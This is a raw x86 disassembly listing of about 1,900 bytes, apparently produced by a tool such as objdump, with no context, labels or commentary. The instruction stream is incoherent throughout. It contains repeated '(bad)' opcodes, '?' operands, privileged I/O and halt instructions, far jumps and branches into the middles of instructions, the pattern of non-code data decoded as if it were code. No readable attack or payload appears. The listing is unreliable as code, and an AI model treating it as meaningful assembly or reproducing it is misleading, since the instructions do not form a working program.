  419c00:	(bad)  
  419c01:	ja     0x419bc6
  419c03:	add    eax,0xa77e1da9
  419c08:	int3   
  419c09:	add    ecx,DWORD PTR [esi-0x1f]
  419c0c:	iret   
  419c0d:	jae    0x419c74
  419c0f:	stc    
  419c10:	(bad)  
  419c11:	dec    eax
  419c12:	outs   dx,DWORD PTR ds:[esi]
  419c13:	cmp    al,0x4b
  419c15:	inc    ebp
  419c16:	mov    esp,DWORD PTR [edi]
  419c18:	push   ecx
  419c19:	or     DWORD PTR [ebp+0x6a8468eb],ebp
  419c1f:	imul   esi,eax,0x23a238b3
  419c25:	popa   
  419c26:	dec    eax
  419c27:	push   0x18
  419c29:	mov    cl,0x55
  419c2b:	test   DWORD PTR [edx],eax
  419c2d:	push   ds
  419c2e:	les    ebx,FWORD PTR [edi-0x24b55aae]
  419c34:	fnstcw WORD PTR [ecx]
  419c36:	jnp    0x419c01
  419c38:	jae    0x419bec
  419c3a:	scas   al,BYTE PTR es:[edi]
  419c3b:	retf   
  419c3c:	popa   
  419c3d:	(bad)  
  419c3e:	aam    0x8e
  419c40:	cmovb  eax,eax
  419c43:	popf   
  419c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c45:	inc    esi
  419c46:	imul   eax,DWORD PTR [ecx+ecx*4-0x5e422ac5],0xa9f51a35
  419c51:	push   ecx
  419c52:	fcom   DWORD PTR [edx+0x61]
  419c55:	ret    0xc660
  419c58:	sub    cl,BYTE PTR [ebp-0x30]
  419c5b:	(bad)  
  419c5c:	mov    eax,ds:0x8697746a
  419c61:	inc    esi
  419c62:	mov    ecx,0x701efbee
  419c67:	pop    ds
  419c68:	pop    ebx
  419c69:	mov    edx,0xda3d9fda
  419c6e:	repz fsubr st,st(2)
  419c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c72:	pop    edi
  419c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c74:	cmc    
  419c75:	or     ecx,DWORD PTR [esp+ebp*4-0x14]
  419c79:	fwait
  419c7a:	pushf  
  419c7b:	fcomp  QWORD PTR [ecx+eax*4+0x5f]
  419c7f:	imul   ebp,DWORD PTR [edi-0x2813ee0c],0x11
  419c86:	rcr    DWORD PTR [ebp+0x7c56d655],cl
  419c8c:	sbb    ebp,DWORD PTR [edx-0x7d550955]
  419c92:	dec    ebx
  419c93:	repnz test ebp,edi
  419c96:	jns    0x419d0a
  419c98:	and    BYTE PTR [ecx-0x59ba328a],bh
  419c9e:	retf   
  419c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ca0:	out    dx,eax
  419ca1:	xchg   edi,eax
  419ca2:	stos   BYTE PTR es:[edi],al
  419ca3:	outs   dx,DWORD PTR ds:[esi]
  419ca4:	pop    esi
  419ca5:	mov    eax,0x8be0d989
  419caa:	nop
  419cab:	cmp    eax,0xd86e5c6f
  419cb0:	lahf   
  419cb1:	add    BYTE PTR [edi+0x64761568],dh
  419cb7:	mov    ebp,0xf73114e1
  419cbc:	mov    bl,0x10
  419cbe:	mov    bh,0x26
  419cc0:	dec    esp
  419cc1:	pop    es
  419cc2:	xchg   ebp,eax
  419cc3:	pushf  
  419cc4:	mov    ?,edi
  419cc6:	ins    DWORD PTR es:[edi],dx
  419cc7:	jl     0x419c87
  419cc9:	cmp    al,0x9d
  419ccb:	xchg   edx,edi
  419ccd:	enter  0x674f,0xca
  419cd1:	xchg   dl,bh
  419cd3:	cmp    DWORD PTR [ebp+0x3e],ebx
  419cd6:	repz test eax,0xd62acee5
  419cdc:	loope  0x419cea
  419cde:	lock sub eax,0xc1d7aa65
  419ce4:	test   DWORD PTR [ebp+0x34],edx
  419ce7:	xchg   BYTE PTR [ecx+0x11],ch
  419cea:	xchg   BYTE PTR [eax],ch
  419cec:	lock out dx,eax
  419cee:	mov    ebx,0xe9bc52b0
  419cf3:	retf   0x3813
  419cf6:	div    DWORD PTR [edx-0x211ed144]
  419cfc:	in     al,dx
  419cfd:	ss hlt 
  419cff:	stos   DWORD PTR es:[edi],eax
  419d00:	push   cs
  419d01:	(bad)
  419d05:	fisub  DWORD PTR [esi+0x18]
  419d08:	cmp    eax,0xdd5b2e7c
  419d0d:	fsubr  DWORD PTR [ecx+0x50655956]
  419d13:	push   ds
  419d14:	out    dx,eax
  419d15:	cld    
  419d16:	arpl   ax,sp
  419d18:	adc    al,0x1e
  419d1a:	mov    ch,0xa0
  419d1c:	lds    edi,FWORD PTR [edx+0x9]
  419d1f:	inc    ecx
  419d20:	push   ebx
  419d21:	mov    ch,0xde
  419d23:	cmp    al,0x6b
  419d25:	mov    ah,0xfe
  419d27:	test   bl,bl
  419d29:	pop    eax
  419d2a:	stc    
  419d2b:	int    0x2d
  419d2d:	xchg   DWORD PTR [eax-0x7e],edx
  419d30:	call   DWORD PTR [edi-0x7231ae08]
  419d36:	mov    esp,DWORD PTR [ecx]
  419d38:	push   0x22
  419d3a:	ret    0x84f5
  419d3d:	adc    al,0xbf
  419d3f:	into   
  419d40:	sub    edi,ebx
  419d42:	cld    
  419d43:	xchg   edx,eax
  419d44:	xor    BYTE PTR [ebx+ebp*2+0x274b5ce8],dh
  419d4b:	outs   dx,BYTE PTR ds:[esi]
  419d4c:	addr16 mov bh,0x7a
  419d4f:	addr16 gs fs retf 0xfd70
  419d55:	ret    
  419d56:	inc    ecx
  419d57:	sbb    dl,BYTE PTR [edx-0x727e32f4]
  419d5d:	or     edi,0x457af64c
  419d63:	ror    DWORD PTR [ebx],1
  419d65:	aam    0x3f
  419d67:	cmc    
  419d68:	dec    edi
  419d69:	push   edx
  419d6a:	dec    eax
  419d6b:	mov    al,0x6
  419d6d:	mov    esi,0x5ffac168
  419d72:	jmp    0x419dc2
  419d74:	enter  0x6b2,0x1b
  419d78:	xor    bl,BYTE PTR [ebx-0x457bb7fe]
  419d7e:	fmul   DWORD PTR [eax+0x6120c7b3]
  419d84:	sar    DWORD PTR [eax+edi*2+0x147df4eb],0x87
  419d8c:	push   es
  419d8d:	aad    0x38
  419d8f:	es adc eax,0x96e642c0
  419d95:	jo     0x419d6a
  419d97:	jp     0x419e17
  419d99:	(bad)  
  419d9a:	ins    BYTE PTR es:[edi],dx
  419d9b:	lock xchg DWORD PTR [esi+ebx*1],esp
  419d9f:	or     bl,BYTE PTR [edx]
  419da1:	mov    ecx,0xc9346133
  419da6:	xchg   ebp,eax
  419da7:	imul   esp
  419da9:	pop    edi
  419daa:	leave  
  419dab:	mov    bl,BYTE PTR [edx-0x16]
  419dae:	sbb    eax,0x8bdcbbfa
  419db3:	ret    
  419db4:	adc    bl,0x17
  419db7:	call   0x5b91b9bb
  419dbc:	xchg   ebp,eax
  419dbd:	push   eax
  419dbe:	into   
  419dbf:	xchg   esi,eax
  419dc0:	xor    dh,BYTE PTR [ebx-0x53]
  419dc3:	pop    ss
  419dc4:	dec    edi
  419dc5:	aam    0x64
  419dc7:	jnp    0x419d83
  419dc9:	push   0xffffffb9
  419dcb:	inc    eax
  419dcc:	mov    al,ds:0x5e3d2f8e
  419dd1:	jno    0x419e2a
  419dd3:	icebp  
  419dd4:	mov    dh,0x30
  419dd6:	and    eax,0x910ff17e
  419ddb:	lea    ebp,[esi]
  419ddd:	popf   
  419dde:	dec    eax
  419ddf:	scas   eax,DWORD PTR es:[edi]
  419de0:	sbb    eax,0x9c305abf
  419de5:	sbb    DWORD PTR [edi-0x5d],ecx
  419de8:	icebp  
  419de9:	in     al,0x70
  419deb:	retf   
  419dec:	in     al,dx
  419ded:	and    al,0x4d
  419def:	mov    ds:0xe6b7b067,eax
  419df4:	test   bl,bl
  419df6:	jae    0x419e17
  419df8:	jmp    0x419e35
  419dfa:	(bad)  
  419dfb:	push   edx
  419dfc:	ret    0xb31e
  419dff:	mov    bl,0x73
  419e01:	pop    ecx
  419e02:	sub    eax,0xf1698161
  419e07:	daa    
  419e08:	popf   
  419e09:	inc    edi
  419e0a:	mov    esp,?
  419e0c:	mov    ecx,0x6d8eabb1
  419e11:	ret    
  419e12:	imul   esp,esi,0xeb800654
  419e18:	jns    0x419dca
  419e1a:	popf   
  419e1b:	push   ds
  419e1c:	mov    ebp,0x814e2305
  419e21:	mov    eax,0xddef4bfd
  419e26:	add    edi,DWORD PTR [eax-0x22]
  419e29:	jbe    0x419e4b
  419e2b:	lods   eax,DWORD PTR ds:[esi]
  419e2c:	mov    BYTE PTR [ebx],cl
  419e2e:	jl     0x419eaf
  419e30:	bound  esi,QWORD PTR [ebx+0x37]
  419e33:	pop    es
  419e34:	and    BYTE PTR [esp+ebx*1-0x5ff6e674],0x73
  419e3c:	cmp    bl,BYTE PTR [edi+0x70208dfc]
  419e42:	lahf   
  419e43:	(bad)  
  419e45:	cmp    BYTE PTR ds:0xf6c4e7f,0x59
  419e4c:	xor    al,0x75
  419e4e:	add    al,0xd0
  419e50:	rcr    esi,1
  419e52:	mul    DWORD PTR [ecx]
  419e54:	icebp  
  419e55:	jmp    0xaaafef
  419e5a:	test   al,0x65
  419e5c:	mov    dl,0x53
  419e5e:	lock xor al,0xfc
  419e61:	out    0xcc,eax
  419e63:	es aad 0x81
  419e66:	aaa    
  419e67:	adc    eax,0xe0a6edea
  419e6c:	imul   ebx,DWORD PTR [edi+edi*4-0xf],0x70f6f9b3
  419e74:	mov    bh,0xba
  419e76:	jge    0x419ec6
  419e78:	and    ebx,ebx
  419e7a:	out    0xef,eax
  419e7c:	data16 int 0xb
  419e7f:	je     0x419ef6
  419e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e82:	shr    DWORD PTR [edi],0xb2
  419e85:	dec    edi
  419e86:	mov    DWORD PTR [ecx-0x3f1e9397],ebx
  419e8c:	(bad)  
  419e8d:	or     eax,0xe950ae22
  419e92:	dec    edi
  419e93:	cmp    edi,DWORD PTR [ebp+esi*2+0x298983f5]
  419e9a:	pop    edi
  419e9b:	jp     0x419e6e
  419e9d:	mov    dl,0x86
  419e9f:	add    BYTE PTR [edi],0x97
  419ea2:	fldenv [ecx-0x44075686]
  419ea8:	call   0x244b4275
  419ead:	cdq    
  419eae:	std    
  419eaf:	fcom   QWORD PTR ds:0x232023f3
  419eb5:	repnz push esi
  419eb7:	popa   
  419eb8:	iret   
  419eb9:	ins    BYTE PTR es:[edi],dx
  419eba:	xchg   edx,eax
  419ebb:	cs std 
  419ebd:	sub    bl,BYTE PTR [edx-0x62]
  419ec0:	out    dx,al
  419ec1:	imul   esi,DWORD PTR [esi],0x683e268f
  419ec7:	pop    ebx
  419ec8:	mov    DWORD PTR [esi],edx
  419eca:	sub    ecx,ecx
  419ecc:	or     DWORD PTR [edi],esp
  419ece:	fnstsw WORD PTR [edi]
  419ed0:	push   0x5c5437d6
  419ed5:	inc    esi
  419ed6:	sbb    BYTE PTR [eax+0x70],bh
  419ed9:	cmp    al,0x5e
  419edb:	or     cl,BYTE PTR [ecx-0x4e272243]
  419ee1:	outs   dx,BYTE PTR ds:[esi]
  419ee2:	jecxz  0x419e7b
  419ee4:	push   eax
  419ee5:	and    dh,BYTE PTR [esi]
  419ee7:	xlat   BYTE PTR ds:[ebx]
  419ee8:	std    
  419ee9:	aad    0x3f
  419eeb:	pop    ebp
  419eec:	sbb    DWORD PTR [ebp+0x2e8528f0],edi
  419ef2:	sub    eax,DWORD PTR [esi]
  419ef4:	mov    ebx,0x5a5ee308
  419ef9:	mov    WORD PTR [edi-0x1c],?
  419efc:	and    bl,BYTE PTR [eax-0x64c88285]
  419f02:	jge    0x419f71
  419f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f05:	mov    al,0xf7
  419f07:	ja     0x419f80
  419f09:	xchg   ecx,eax
  419f0a:	fild   WORD PTR [ebp+0x4c]
  419f0d:	jge    0x419eec
  419f0f:	jecxz  0x419f81
  419f11:	imul   ecx,ebp,0xdb907131
  419f17:	mov    WORD PTR [ecx+0x46490c18],es
  419f1d:	in     al,dx
  419f1e:	nop
  419f1f:	outs   dx,BYTE PTR ds:[esi]
  419f20:	es sub eax,0x50f9b1fc
  419f26:	fdivp  st(4),st
  419f28:	jno    0x419f62
  419f2a:	mov    ebp,0xb3ad0321
  419f2f:	sbb    bl,BYTE PTR [ebx+0x6e]
  419f32:	clc    
  419f33:	and    DWORD PTR [esi],esp
  419f35:	ja     0x419ee1
  419f37:	and    dh,ah
  419f39:	test   al,0xba
  419f3b:	fwait
  419f3c:	jae    0x419fb3
  419f3e:	pop    ss
  419f3f:	repnz dec ebx
  419f41:	lock cmp al,0x41
  419f44:	mov    DWORD PTR [edx],eax
  419f46:	(bad)  
  419f47:	or     BYTE PTR [ebx+0x7992cc60],ah
  419f4d:	test   DWORD PTR [edx-0x3b5e8df4],esp
  419f53:	cli    
  419f54:	dec    eax
  419f55:	sti    
  419f56:	loop   0x419f31
  419f58:	and    ch,dh
  419f5a:	fidivr WORD PTR [ecx+0x70de8ffd]
  419f60:	nop
  419f61:	psrld  mm5,mm4
  419f64:	into   
  419f65:	outs   dx,DWORD PTR ds:[esi]
  419f66:	pop    ebp
  419f67:	sbb    eax,0x40f4950f
  419f6c:	jge    0x419fc7
  419f6e:	div    eax
  419f70:	and    cl,BYTE PTR [ebp+0x3fb7a050]
  419f76:	je     0xb7f906a2
  419f7c:	sbb    ch,BYTE PTR es:[edi+eiz*8]
  419f80:	push   esi
  419f81:	popa   
  419f82:	sahf   
  419f83:	pop    edi
  419f84:	xor    DWORD PTR [edi+ebp*2-0x6f],0xffffffeb
  419f89:	fs sbb al,0x79
  419f8c:	ror    BYTE PTR [esi+0x57365513],cl
  419f92:	add    esi,eax
  419f94:	pop    ds
  419f95:	adc    al,0xe3
  419f97:	pop    esi
  419f98:	mov    esi,DWORD PTR gs:[ebx+0x7f]
  419f9c:	jg     0x419f67
  419f9e:	ret    
  419f9f:	arpl   cx,dx
  419fa1:	leave  
  419fa2:	jmp    0x9f49:0x843cf271
  419fa9:	push   edx
  419faa:	(bad)  
  419fac:	dec    edi
  419fad:	lea    ecx,[eax+0x6e]
  419fb0:	(bad)  
  419fb1:	(bad)  
  419fb3:	and    DWORD PTR [eax-0x13],esi
  419fb6:	inc    esp
  419fb7:	sub    DWORD PTR [esi],ebp
  419fb9:	ret    
  419fba:	add    esp,DWORD PTR [esi+0x614616c4]
  419fc0:	pop    edi
  419fc1:	xlat   BYTE PTR ds:[ebx]
  419fc2:	rcr    bl,1
  419fc4:	ins    BYTE PTR es:[edi],dx
  419fc5:	pop    ds
  419fc6:	aam    0xfe
  419fc8:	push   edx
  419fc9:	fisub  DWORD PTR [esp+ebp*1]
  419fcc:	pop    eax
  419fcd:	push   eax
  419fce:	pushf  
  419fcf:	add    eax,0x83ddd2ec
  419fd4:	inc    edx
  419fd5:	popa   
  419fd6:	call   0x829d:0xb48e9581
  419fdd:	daa    
  419fde:	inc    edi
  419fdf:	imul   eax,DWORD PTR [ebx+edx*2],0x5160f66
  419fe6:	pop    esi
  419fe7:	mov    al,ds:0x9936c3be
  419fec:	mov    BYTE PTR [ecx+0x8ddc032],bl
  419ff2:	sbb    eax,0xebf62df8
  419ff7:	lds    edi,FWORD PTR [eax]
  419ff9:	scas   eax,DWORD PTR es:[edi]
  419ffa:	xor    BYTE PTR [edi],bl
  419ffc:	rcl    BYTE PTR [ebx-0x5b],1
  419fff:	stc    
  41a000:	pop    esp
  41a001:	sbb    BYTE PTR [eax+0x3a],0x8d
  41a005:	adc    DWORD PTR [ebx],esp
  41a007:	push   cs
  41a008:	sbb    al,al
  41a00a:	js     0x419fe4
  41a00c:	lds    ebx,FWORD PTR [eax]
  41a00e:	cdq    
  41a00f:	(bad)  
  41a010:	rol    al,cl
  41a012:	push   esp
  41a013:	hlt    
  41a014:	jae    0x419fad
  41a016:	inc    edx
  41a017:	shl    DWORD PTR [edx+0x9997741],0xbd
  41a01e:	fs add al,0x3d
  41a021:	pop    esi
  41a022:	enter  0x60be,0x9
  41a026:	outs   dx,DWORD PTR ds:[esi]
  41a027:	jge    0x419fb6
  41a029:	inc    esi
  41a02a:	mov    bl,0x39
  41a02c:	out    0xc3,eax
  41a02e:	in     eax,dx
  41a02f:	mov    edx,0xc8fc5cd0
  41a034:	loop   0x41a04f
  41a036:	jle    0x41a0a2
  41a038:	sahf   
  41a039:	enter  0xd9ac,0x1a
  41a03d:	adc    BYTE PTR [eax-0x17],ch
  41a040:	push   edi
  41a041:	dec    ecx
  41a042:	mov    dl,0xab
  41a044:	xor    eax,0xf4ad2d0f
  41a049:	sahf   
  41a04a:	pop    ecx
  41a04b:	fst    QWORD PTR [esi-0x69d5a014]
  41a051:	sbb    ah,BYTE PTR [ebp+0x2b]
  41a054:	imul   ecx,DWORD PTR [ebx+0x8b4114e],0x77142bae
  41a05e:	adc    esi,DWORD PTR ds:0x50622aed
  41a064:	mov    al,ds:0x32c11b09
  41a069:	xor    edi,DWORD PTR [edi-0x54a71ebf]
  41a06f:	lea    esi,[esi-0x2f]
  41a072:	test   BYTE PTR [ebp-0xf],0x6
  41a076:	add    al,0xf
  41a078:	repnz mov ch,0xeb
  41a07b:	and    ch,ah
  41a07d:	in     al,dx
  41a07e:	push   edi
  41a07f:	inc    ebx
  41a080:	mul    cl
  41a082:	clc    
  41a083:	push   0x56
  41a085:	push   edi
  41a086:	xchg   ecx,eax
  41a087:	sbb    dl,ch
  41a089:	pshufw mm4,QWORD PTR [esi+0x56],0x16
  41a08e:	ds cmp al,0x2f
  41a091:	test   al,0x27
  41a093:	rcl    BYTE PTR [edi-0x30],0x5
  41a097:	rcr    DWORD PTR [esi],cl
  41a099:	xor    BYTE PTR ds:0x3e3d7531,dl
  41a09f:	or     dl,BYTE PTR [ebp+0x119bddf4]
  41a0a5:	repnz in eax,dx
  41a0a7:	sbb    edx,eax
  41a0a9:	inc    ebx
  41a0aa:	xor    ebx,0xb0b6f467
  41a0b0:	(bad)  
  41a0b1:	cmc    
  41a0b2:	out    dx,eax
  41a0b3:	jle    0x41a0ee
  41a0b5:	mov    dl,0x12
  41a0b7:	adc    bl,dh
  41a0b9:	push   ebx
  41a0ba:	dec    ecx
  41a0bb:	js     0x41a06a
  41a0bd:	pop    edi
  41a0be:	mov    eax,ds:0x4f7f7ced
  41a0c3:	cld    
  41a0c4:	int3   
  41a0c5:	jg     0x41a12e
  41a0c7:	rcl    DWORD PTR [edi+0x5a],1
  41a0ca:	pop    ds
  41a0cb:	ds mov dl,ch
  41a0ce:	sbb    ecx,DWORD PTR [eax+0x3a]
  41a0d1:	call   0x70af8cbe
  41a0d6:	fwait
  41a0d7:	push   0x328641d
  41a0dc:	rcl    BYTE PTR [edx],0xe7
  41a0df:	mov    ah,0x71
  41a0e1:	jge    0x41a074
  41a0e3:	mov    ebp,DWORD PTR ss:[ebx+0xc80e320]
  41a0ea:	xor    BYTE PTR [ecx-0x18e5fd56],bh
  41a0f0:	test   DWORD PTR [eax-0x5851afc7],esp
  41a0f6:	imul   ebp,DWORD PTR [edi],0x46801fe8
  41a0fc:	pop    es
  41a0fd:	sub    eax,0x9c7acf13
  41a102:	mov    esp,0x854a7490
  41a107:	sbb    eax,0x2add772e
  41a10c:	popa   
  41a10d:	lock test eax,0x69d1e5c2
  41a113:	inc    ebx
  41a114:	fimul  DWORD PTR [ebp-0x2a]
  41a117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a118:	pop    esi
  41a119:	div    BYTE PTR [esi-0x5f]
  41a11c:	sub    eax,0x734b330a
  41a121:	xor    al,0x5d
  41a123:	rcl    BYTE PTR [edx-0x17c0d002],1
  41a129:	popf   
  41a12a:	clc    
  41a12b:	repz push ss
  41a12d:	lods   eax,DWORD PTR ds:[esi]
  41a12e:	sbb    dl,BYTE PTR [edx]
  41a130:	mov    al,ds:0x3f43387
  41a135:	pop    ecx
  41a136:	nop
  41a137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a138:	sti    
  41a139:	mov    esp,0x6e2ad1d7
  41a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a13f:	xor    esi,ecx
  41a141:	dec    edi
  41a142:	xchg   edi,eax
  41a143:	ror    ebx,cl
  41a145:	rcl    BYTE PTR [eax+0x4b],0xeb
  41a149:	in     eax,0xcf
  41a14b:	xor    bl,al
  41a14d:	scas   eax,DWORD PTR es:[edi]
  41a14e:	scas   al,BYTE PTR es:[edi]
  41a14f:	push   edi
  41a150:	cmc    
  41a151:	lahf   
  41a152:	push   esi
  41a153:	sar    DWORD PTR [ebp-0x4a9c47dc],0xea
  41a15a:	(bad)  
  41a15c:	fldcw  WORD PTR [esi+0x4a825691]
  41a162:	loopne 0x41a10d
  41a164:	lahf   
  41a165:	or     DWORD PTR [edi+0x39],ebp
  41a168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a169:	test   al,0xff
  41a16b:	lea    esp,[ecx-0x2f]
  41a16e:	ret    
  41a16f:	sub    dh,BYTE PTR [ecx+0x6f5f1352]
  41a175:	ficomp WORD PTR [ecx]
  41a177:	sub    BYTE PTR [ebp-0x7e7a4ac0],0x20
  41a17e:	cmp    al,0x41
  41a180:	xchg   BYTE PTR [esi+0x2eee5e93],al
  41a186:	inc    ebx
  41a187:	(bad)  
  41a188:	int3   
  41a189:	sub    eax,DWORD PTR [esi-0x47736015]
  41a18f:	jne    0x41a124
  41a191:	in     eax,0xb0
  41a193:	pop    eax
  41a194:	add    BYTE PTR [eax-0x42495d3e],al
  41a19a:	js     0x41a16c
  41a19c:	xchg   ebx,eax
  41a19d:	stos   BYTE PTR es:[edi],al
  41a19e:	xchg   ecx,eax
  41a19f:	inc    ebp
  41a1a0:	in     eax,0xb7
  41a1a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1a3:	inc    edx
  41a1a4:	push   ss
  41a1a5:	push   ss
  41a1a6:	test   BYTE PTR [ebx-0x38],bh
  41a1a9:	(bad)  
  41a1aa:	aaa    
  41a1ab:	data16 js 0x41a200
  41a1ae:	sbb    al,BYTE PTR [eax-0x61bcf026]
  41a1b4:	nop
  41a1b5:	xchg   ecx,eax
  41a1b6:	jbe    0x41a1ac
  41a1b8:	sbb    ebp,DWORD PTR [esi+ecx*1]
  41a1bb:	or     esi,DWORD PTR es:[edx+0x67]
  41a1bf:	cmp    DWORD PTR [eax],0x93238f66
  41a1c5:	aas    
  41a1c6:	xchg   edi,edx
  41a1c8:	cmp    DWORD PTR [ebp+0x71],edi
  41a1cb:	mov    dh,BYTE PTR [edx+0x754d4dc4]
  41a1d1:	out    0x1d,eax
  41a1d3:	shl    DWORD PTR [edx],1
  41a1d5:	ds push edi
  41a1d7:	js     0x41a234
  41a1d9:	jae    0x41a244
  41a1db:	adc    BYTE PTR [eax-0x719de562],cl
  41a1e1:	xchg   ebp,eax
  41a1e2:	jmp    0x41a18f
  41a1e4:	or     al,0x97
  41a1e6:	jge    0x41a25f
  41a1e8:	(bad)  
  41a1e9:	sti    
  41a1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1eb:	loopne 0x41a1b6
  41a1ed:	pop    eax
  41a1ee:	inc    eax
  41a1ef:	loopne 0x41a1f0
  41a1f1:	or     cl,ah
  41a1f3:	jmp    0x41a204
  41a1f5:	pop    ebx
  41a1f6:	or     al,0xbc
  41a1f8:	jb     0x41a265
  41a1fa:	enter  0x5991,0xd0
  41a1fe:	inc    esp
  41a1ff:	sub    al,0xba
  41a201:	loopne 0x41a22a
  41a203:	enter  0x3f9c,0xa
  41a207:	mov    esp,0xdda3948b
  41a20c:	xchg   ebp,eax
  41a20d:	dec    ebp
  41a20e:	je     0x41a23f
  41a210:	aaa    
  41a211:	push   ecx
  41a212:	cs ins DWORD PTR es:[edi],dx
  41a214:	cmp    cl,bl
  41a216:	inc    ebp
  41a217:	cmc    
  41a218:	mov    ds:0x1a4df451,eax
  41a21d:	xchg   BYTE PTR [edi-0x55],cl
  41a220:	stos   BYTE PTR es:[edi],al
  41a221:	cmp    BYTE PTR [esp+ebx*4-0x43],dl
  41a225:	js     0x41a1ec
  41a227:	push   edx
  41a228:	scas   al,BYTE PTR es:[edi]
  41a229:	out    dx,eax
  41a22a:	iret   
  41a22b:	adc    ch,0x6f
  41a22e:	loopne 0x41a261
  41a230:	fld    st(4)
  41a232:	int    0xa9
  41a234:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a236:	addr16 pushf 
  41a238:	push   eax
  41a239:	and    esp,DWORD PTR [eax]
  41a23b:	in     al,dx
  41a23c:	xchg   edi,eax
  41a23d:	mov    cl,0x93
  41a23f:	(bad)  
  41a240:	mov    ds:0x19a474f2,al
  41a245:	jle    0x41a21d
  41a247:	retf   0x6444
  41a24a:	mov    dh,0x47
  41a24c:	jb     0x41a225
  41a24e:	jb     0x41a28c
  41a250:	xor    al,0x32
  41a252:	jns    0x41a245
  41a254:	inc    esi
  41a255:	mov    esi,0x1aead311
  41a25a:	sbb    ebx,DWORD PTR [ecx-0x21b47d6a]
  41a260:	iret   
  41a261:	lea    esi,[eax+0x538de8c4]
  41a267:	jae    0x41a1f7
  41a269:	leave  
  41a26a:	dec    edx
  41a26b:	fidiv  WORD PTR [ebx-0x6cad4f4d]
  41a271:	test   al,0x29
  41a273:	out    dx,al
  41a274:	xchg   esp,eax
  41a275:	inc    ebx
  41a276:	sbb    edi,DWORD PTR [edi]
  41a278:	cmp    al,0xd0
  41a27a:	mov    esp,0xd3a823d1
  41a27f:	sbb    edi,DWORD PTR [edi]
  41a281:	mov    BYTE PTR [eax],dl
  41a283:	xchg   dh,al
  41a285:	ss push 0x4ef7d7c4
  41a28b:	and    al,0x16
  41a28d:	mov    edx,0x67f99f29
  41a292:	mov    eax,ds:0xc6d0ab57
  41a297:	je     0x41a272
  41a299:	mov    WORD PTR [edx-0x7d],gs
  41a29c:	mov    bh,0x25
  41a29e:	push   esi
  41a29f:	ins    BYTE PTR es:[edi],dx
  41a2a0:	push   edx
  41a2a1:	arpl   WORD PTR [ecx+ebx*4],ax
  41a2a4:	jg     0x41a2c8
  41a2a6:	les    eax,FWORD PTR [edx+ebp*8]
  41a2a9:	add    eax,0xd8c62da0
  41a2ae:	xchg   ebp,eax
  41a2af:	aam    0x1e
  41a2b1:	sbb    al,0x71
  41a2b3:	stos   DWORD PTR es:[edi],eax
  41a2b4:	sub    DWORD PTR [esp+ecx*8],ecx
  41a2b7:	adc    bl,BYTE PTR [edi+edx*2]
  41a2ba:	retf   
  41a2bb:	mov    bl,0x33
  41a2bd:	call   FWORD PTR [edx+0x71]
  41a2c0:	xchg   dh,cl
  41a2c2:	es scas eax,DWORD PTR es:[edi]
  41a2c4:	xor    ecx,DWORD PTR [esi-0x33]
  41a2c7:	into   
  41a2c8:	push   ebp
  41a2c9:	aaa    
  41a2ca:	sub    DWORD PTR [ebx-0x7864c835],0xfffffff2
  41a2d1:	in     al,0xae
  41a2d3:	mov    cl,0x11
  41a2d5:	push   edx
  41a2d6:	and    BYTE PTR [edi],0x3b
  41a2d9:	dec    esi
  41a2da:	mov    edi,0x4a642fe2
  41a2df:	mov    ch,0xef
  41a2e1:	sbb    eax,0xfba62bec
  41a2e6:	shl    DWORD PTR [ebp-0x80],1
  41a2e9:	mov    ds:0x9b36539d,al
  41a2ee:	cli    
  41a2ef:	cld    
  41a2f0:	out    dx,eax
  41a2f1:	or     BYTE PTR [eax-0x571ed5ca],0xe5
  41a2f8:	test   BYTE PTR [eax-0x4c],cl
  41a2fb:	ret    
  41a2fc:	outs   dx,DWORD PTR ds:[esi]
  41a2fd:	leave  
  41a2fe:	sub    eax,0xc83dab53
  41a303:	add    BYTE PTR [edi+eiz*4],ah
  41a306:	push   edi
  41a307:	std    
  41a308:	scas   eax,DWORD PTR es:[edi]
  41a309:	mov    DWORD PTR [edi-0x72],0x6a796213
  41a310:	push   edx
  41a311:	jle    0x41a328
  41a313:	pop    esi
  41a314:	or     ch,dh
  41a316:	in     al,dx
  41a317:	retf   0x7d7
  41a31a:	rcl    BYTE PTR [edx-0x59],1
  41a31d:	mov    edx,0xbe6d8fac
  41a322:	fucom  st(1)
  41a324:	(bad)  
  41a325:	push   ds
  41a326:	retf   0x6458
  41a329:	dec    esp
  41a32a:	pop    ds
  41a32b:	cs pusha 
  41a32d:	dec    esi
  41a32e:	mov    edx,0xcd2612ae
  41a333:	and    al,0x11
  41a335:	mov    eax,0x973998f0
  41a33a:	stos   BYTE PTR es:[edi],al
  41a33b:	popf   
  41a33c:	in     al,0x7d
  41a33e:	call   0xb4440ceb
  41a343:	mov    WORD PTR [esi],ss
  41a345:	pop    ebx
  41a346:	hlt    
  41a347:	mov    cs,edx
  41a349:	cmp    edx,edi
  41a34b:	sti    
  41a34c:	loopne 0x41a361
  41a34e:	(bad)  
  41a34f:	loope  0x41a39d
  41a351:	enter  0xed5c,0x90
  41a355:	jns    0x41a37a
  41a357:	cwde   
  41a358:	push   edi
  41a359:	add    eax,0x8c4f787
  41a35e:	dec    edi
  41a35f:	jns    0x41a377
  41a361:	stc    
  41a362:	xchg   ebx,eax
  41a363:	inc    esi
  41a364:	xchg   ebp,eax
  41a365:	xchg   DWORD PTR [ebp+0x9],ebx
  41a368:	fwait
  41a369:	(bad)  
  41a36a:	sub    al,0x92
  41a36c:	in     eax,0x9a
  41a36e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a36f:	adc    eax,0xdfbefad7
  41a374:	push   0xffffffbc
  41a376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a377:	xlat   BYTE PTR ds:[ebx]
  41a378:	mov    ch,0x9
  41a37a:	cmp    eax,0xccbd961f
  41a37f:	sbb    BYTE PTR [ebx],bl
  41a381:	dec    ebx
